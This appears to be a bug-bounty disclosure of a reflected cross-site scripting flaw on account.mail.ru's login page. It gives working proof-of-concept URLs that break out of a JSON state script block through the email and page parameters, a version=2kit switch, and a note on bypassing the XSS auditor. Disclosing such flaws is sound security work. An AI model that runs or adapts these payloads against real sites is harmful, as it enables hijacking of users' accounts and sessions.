title: XSS account.mail.ru in state JSON script

summaries.content_html: Reflected XSS on https://account.mail.ru/login

activities.message:
in case if you can't reproduce
state script there with
```
<meta name="SSR_TIME" version="2kit" content="18" />
```
but not when used
```
<meta name="SSR_TIME" version="fest" content="4"/>
```
in that case used
```
<script type="text/html" id="json">
```
and looks like fest version better protected, not just by escaping `</script>`

to switch use `version=2kit` param
```
https://account.mail.ru/login?version=2kit&email=</script/><script>`</script>`;alert(1)//@mail.ru
```
more consistent and works in incognito mode (with XSS auditor bypass)
activities.markdown_message:
in case if you can't reproduce
state script there with

<meta name="SSR_TIME" version="2kit" content="18" />

but not when used

<meta name="SSR_TIME" version="fest" content="4"/>

in that case used

<script type="text/html" id="json">

and looks like fest version better protected, not just by escaping </script>

to switch use version=2kit param

https://account.mail.ru/login?version=2kit&email=</script/><script>`</script>`;alert(1)//@mail.ru

more consistent and works in incognito mode (with XSS auditor bypass)

vulnerability_information_html:
Domain, site, application

account.mail.ru

Testing environment

Chrome

Steps to reproduce

Login and open

https://account.mail.ru/login?email=test@mail.ru&fail=1&page=https%3A%2F%2Fe.mail.ru%2Fcgi-bin%2Freadmsg%3Fid%3D15248558440000000928%26from%3Dmail.login%26rb_test_id%3D424%26back%3D1%26from%3Dlogin%26rb_test_id%3D424%26back%3D1%3C/script/%3E%3Cscript%3E`%3C/script%3E`;alert(1)//

Actual results

alert(1)
